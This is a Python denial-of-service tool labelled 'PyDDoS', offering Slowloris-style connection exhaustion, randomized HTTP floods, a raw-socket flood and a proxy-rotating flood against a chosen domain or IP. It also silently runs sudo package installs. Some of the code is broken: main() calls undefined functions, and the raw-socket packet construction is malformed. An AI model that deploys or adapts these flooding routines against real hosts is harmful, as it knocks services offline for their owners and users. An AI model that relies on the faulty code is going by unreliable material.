version= '3.0'
title = '''

      _ \        __ \  __ \               ___|           _)       |   
     |   | |   | |   | |   |  _ \   __| \___ \   __|  __| | __ \  __|  
     ___/  |   | |   | |   | (   |\__ \       | (    |    | |   | |   
    _|    \__, |____/ ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__|  
           ____/                                            _|         
                                                                    
 DDos python script | Script used for testing ddos | Ddos attack     
 Author: ___T7hM1___                                                
 Github: http://github.com/t7hm1/pyddos                             
 Version:'''+version+''' 
'''

import re
import os
import sys
import json
import time
import string
import signal
import http.client
import urllib.parse
from random import randint, choice
from socket import *
from threading import Thread, Lock
from struct import pack
from argparse import ArgumentParser, RawTextHelpFormatter
from synflood import synflood


if os.name == 'posix':
    c = os.system('which pip')
    if c == 256:
        os.system('sudo apt-get install python-pip')
    else:
        pass
else:
    print('[-] Check your pip installer')

try:
    import requests
    import colorama
    from termcolor import colored, cprint
except ImportError:
    try:
        if os.name == 'posix':
            os.system('sudo pip install colorama termcolor requests')
            sys.exit('[+] I have installed necessary modules for you')
        elif os.name == 'nt':
            os.system('pip install colorama requests termcolor')
            sys.exit('[+] I have installed necessary modules for you')
        else:
            sys.exit('[-] Download and install necessary modules')
    except Exception as e:
        print('[-]', e)

if os.name == 'nt':
    colorama.init()

signal.signal(signal.SIGFPE, signal.SIG_DFL)

def fake_ip():
    while True:
        ips = [str(randint(0, 256)) for _ in range(4)]
        if ips[0] == "127":
            continue
        fkip = '.'.join(ips)
        break
    return fkip

def check_tgt(args):
    tgt = args.d
    try:
        ip = gethostbyname(tgt)
    except:
        sys.exit(cprint('[-] Can\'t resolve host: Unknown host!', 'red'))
    return ip

def add_useragent():
    try:
        with open("./ua.txt", "r") as fp:
            uagents = re.findall(r"(.+)\n", fp.read())
    except FileNotFoundError:
        cprint('[-] No file named \'ua.txt\', failed to load User-Agents', 'yellow')
        return []
    return uagents

def add_bots():
    bots = []
    bots.append('http://www.bing.com/search?q=%40&count=50&first=0')
    bots.append('http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8')
    return bots

class Pyslow:
    def __init__(self, tgt, port, to, threads, sleep):
        self.tgt = tgt
        self.port = port
        self.to = to
        self.threads = threads
        self.sleep = sleep
        self.method = ['GET', 'POST']
        self.pkt_count = 0

    def mypkt(self):
        text = choice(self.method) + ' /' + str(randint(1, 999999999)) + ' HTTP/1.1\r\n' + \
               'Host:' + self.tgt + '\r\n' + \
               'User-Agent:' + choice(add_useragent()) + '\r\n' + \
               'Content-Length: 42\r\n'
        pkt = bytes(text, 'utf-8')
        return pkt

    def building_socket(self):
        try:
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            sock.settimeout(self.to)
            sock.connect((self.tgt, int(self.port)))
            self.pkt_count += 3
            if sock:
                sock.sendto(self.mypkt(), (self.tgt, int(self.port)))
                self.pkt_count += 1
        except Exception:
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            sock.settimeout(self.to)
            sock.connect((self.tgt, int(self.port)))
            sock.settimeout(None)
            self.pkt_count += 3
            if sock:
                sock.sendto(self.mypkt(), (self.tgt, int(self.port)))
                self.pkt_count += 1
        except KeyboardInterrupt:
            sys.exit(cprint('[-] Canceled by user', 'red'))
        return sock

    def sending_packets(self):
        try:
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            sock.settimeout(self.to)
            sock.connect((self.tgt, int(self.port)))
            self.pkt_count += 3
            if sock:
                sock.sendall(b'X-a: b\r\n')
                self.pkt_count += 1
        except Exception:
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            sock.settimeout(self.to)
            sock.connect((self.tgt, int(self.port)))
            sock.settimeout(None)
            if sock:
                sock.sendall(b'X-a: b\r\n')
                self.pkt_count += 1
        except KeyboardInterrupt:
            sys.exit(cprint('[-] Canceled by user', 'red'))
        return sock

    def doconnection(self):
        socks = 0
        fail = 0
        lsocks = []
        lhandlers = []
        cprint('\t\tBuilding sockets', 'blue')
        while socks < int(self.threads):
            try:
                sock = self.building_socket()
                if sock:
                    lsocks.append(sock)
                    socks += 1
                    if socks > int(self.threads):
                        break
            except Exception:
                fail += 1
            except KeyboardInterrupt:
                sys.exit(cprint('[-] Canceled by user', 'red'))
        cprint('\t\tSending packets', 'blue')
        while socks < int(self.threads):
            try:
                handler = self.sending_packets()
                if handler:
                    lhandlers.append(handler)
                    socks += 1
                    if socks > int(self.threads):
                        break
                else:
                    pass
            except Exception:
                fail += 1
            except KeyboardInterrupt:
                break
                sys.exit(cprint('[-] Canceled by user', 'red'))
        time.sleep(self.sleep)

class Requester(Thread):
    def __init__(self, tgt):
        Thread.__init__(self)
        self.tgt = tgt
        self.port = None
        self.ssl = False
        self.req = []
        self.lock = Lock()
        url_type = urllib.parse.urlparse(self.tgt)
        if url_type.scheme == 'https':
            self.ssl = True
            if self.ssl:
                self.port = 443
        else:
            self.port = 80

    def header(self):
        cachetype = ['no-cache', 'no-store', 'max-age=' + str(randint(0, 10)), 'max-stale=' + str(randint(0, 100)),
                     'min-fresh=' + str(randint(0, 10)), 'notransform', 'only-if-cache']
        acceptEc = ['compress,gzip', '', '*', 'compress;q=0,5, gzip;q=1.0', 'gzip;q=1.0, indentity; q=0.5, *;q=0']
        acceptC = ['ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15']
        bot = add_bots()
        c = choice(cachetype)
        a = choice(acceptEc)
        http_header = {
            'User-Agent': choice(add_useragent()),
            'Cache-Control': c,
            'Accept-Encoding': a,
            'Keep-Alive': '42',
            'Host': self.tgt,
            'Referer': choice(bot)
        }
        return http_header

    def rand_str(self):
        mystr = []
        for _ in range(3):
            chars = tuple(string.ascii_letters + string.digits)
            text = ''.join(choice(chars) for _ in range(randint(7, 14)))
            mystr.append(text)
        return '&'.join(mystr)

    def create_url(self):
        return self.tgt + '?' + self.rand_str()

    def data(self):
        url = self.create_url()
        http_header = self.header()
        return (url, http_header)

    def run(self):
        try:
            if self.ssl:
                conn = http.client.HTTPSConnection(self.tgt, self.port)
            else:
                conn = http.client.HTTPConnection(self.tgt, self.port)
            self.req.append(conn)
            for reqter in self.req:
                url, http_header = self.data()
                method = choice(['get', 'post'])
                reqter.request(method.upper(), url, None, http_header)
        except KeyboardInterrupt:
            sys.exit(cprint('[-] Canceled by user', 'red'))
        except Exception as e:
            print(e)
        finally:
            self.closeConnections()

    def closeConnections(self):
        for conn in self.req:
            try:
                conn.close()
            except:
                pass

class Synflood(Thread):
    def __init__(self, tgt, ip, sock=None):
        Thread.__init__(self)
        self.tgt = tgt
        self.ip = ip
        self.psh = ''
        if sock is None:
            self.sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
            self.sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
        else:
            self.sock = sock
        self.lock = Lock()

    def checksum(self):
        s = 0
        for i in range(0, len(self.psh), 2):
            w = (ord(self.psh[i]) << 8) + (ord(self.psh[i + 1]))
            s = s + w
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s

    def start_attack(self):
        try:
            while 1:
                self.psh = pack('!BBHHH', 8, 0, 0, randint(0, 1000), 0, 0)
                self.sock.sendto(self.psh, (self.tgt, 0))
        except KeyboardInterrupt:
            sys.exit(cprint('[-] Canceled by user', 'red'))
        except Exception as e:
            print(e)

    def run(self):
        self.start_attack()

class Vsechno:
    def __init__(self, to, max_thr, proxy_file, target, is_https):
        self.to = to
        self.max_thr = max_thr
        self.proxy_file = proxy_file
        self.target = target
        self.is_https = is_https

    def get_proxy_list(self):
        proxies = []
        try:
            with open(self.proxy_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line.startswith('http://') or line.startswith('https://'):
                        proxies.append({'http': line, 'https': line})
                    else:
                        proxies.append({'http': 'http://' + line, 'https': 'https://' + line})
        except Exception as e:
            print(f"[-] Error reading proxy file: {e}")
        return proxies

    def attack(self, proxy):
        if self.is_https:
            proxies = {'https': proxy}
        else:
            proxies = {'http': proxy}
        try:
            while True:
                headers = {
                    'User-Agent': choice(add_useragent()),
                    'Cache-Control': 'no-cache',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive'
                }
                if self.is_https:
                    r = requests.get(self.target, headers=headers, proxies=proxies, timeout=self.to, verify=False)
                else:
                    r = requests.get(self.target, headers=headers, proxies=proxies, timeout=self.to)
                print(f"[+] Sent request via {proxy}")
                time.sleep(1)
        except KeyboardInterrupt:
            sys.exit(cprint('[-] Canceled by user', 'red'))
        except Exception as e:
            print(f"[-] Error with proxy {proxy}: {e}")

    def start(self):
        proxies = self.get_proxy_list()
        threads = []
        for proxy in proxies:
            t = Thread(target=self.attack, args=(proxy,))
            t.start()
            threads.append(t)
            if len(threads) >= self.max_thr:
                break
        for t in threads:
            t.join()

def main():
    # Parse arguments
    parser = ArgumentParser(description=title, formatter_class=RawTextHelpFormatter)
    parser.add_argument('-d', '--domain', dest='d', help='Domain/IP address to flood', required=True)
    parser.add_argument('-p', '--port', dest='p', help='Port number (default: 80)', default=80, type=int)
    parser.add_argument('-T', '--timeout', dest='T', help='Socket timeout (default: 1)', default=1, type=int)
    parser.add_argument('-s', '--sleep', dest='s', help='Sleep time between requests (default: 0)', default=0, type=int)
    parser.add_argument('-m', '--method', dest='m', help='Attack method (default: syn)', choices=['pyslow', 'requester', 'syn', 'vsechno'], default='syn')
    parser.add_argument('-P', '--proxy-file', dest='P', help='File containing proxy list')

    args = parser.parse_args()

    # Call the function responsible for flooding
    if args.m == 'syn':
        synflood(args.d, args.p, args.T, args.s, args.P)
    elif args.m == 'pyslow':
        pyslow(args.d, args.p, args.T, args.s, args.P)
    elif args.m == 'requester':
        requester(args.d, args.p, args.T, args.s, args.P)
    elif args.m == 'vsechno':
        vsechno(args.d, args.p, args.T, args.s, args.P)
    else:
        sys.exit(parser.print_help())

if __name__ == '__main__':
    main()
